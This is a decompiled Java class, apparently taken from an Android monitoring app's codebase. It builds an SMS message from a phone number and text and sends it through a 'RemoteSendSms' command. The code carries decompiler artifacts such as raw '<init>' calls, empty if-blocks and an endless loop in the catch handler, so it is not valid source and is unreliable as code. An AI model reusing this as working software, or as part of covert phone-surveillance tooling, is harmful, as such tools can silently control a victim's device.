package com.vvt.ae;

import com.vvt.ak.a;
import com.vvt.callmanager.ref.SmsMessage;
import com.vvt.callmanager.ref.command.RemoteSendSms;
import java.io.IOException;

public class b
  implements e
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private String c;
  private String d;
  
  public b(String paramString1, String paramString2)
  {
    this.c = paramString1;
    this.d = paramString2;
  }
  
  public boolean a()
  {
    bool1 = a;
    if (bool1) {}
    boolean bool2 = false;
    Object localObject1 = new com/vvt/callmanager/ref/SmsMessage;
    ((SmsMessage)localObject1).<init>();
    Object localObject3 = this.d;
    ((SmsMessage)localObject1).setMessage((String)localObject3);
    localObject3 = this.c;
    ((SmsMessage)localObject1).setPhoneNumber((String)localObject3);
    localObject3 = new com/vvt/callmanager/ref/command/RemoteSendSms;
    ((RemoteSendSms)localObject3).<init>((SmsMessage)localObject1);
    try
    {
      localObject1 = ((RemoteSendSms)localObject3).execute();
      localObject1 = (Boolean)localObject1;
      bool1 = ((Boolean)localObject1).booleanValue();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool1 = b;
        if (bool1) {}
        bool1 = false;
        Object localObject2 = null;
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ae/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */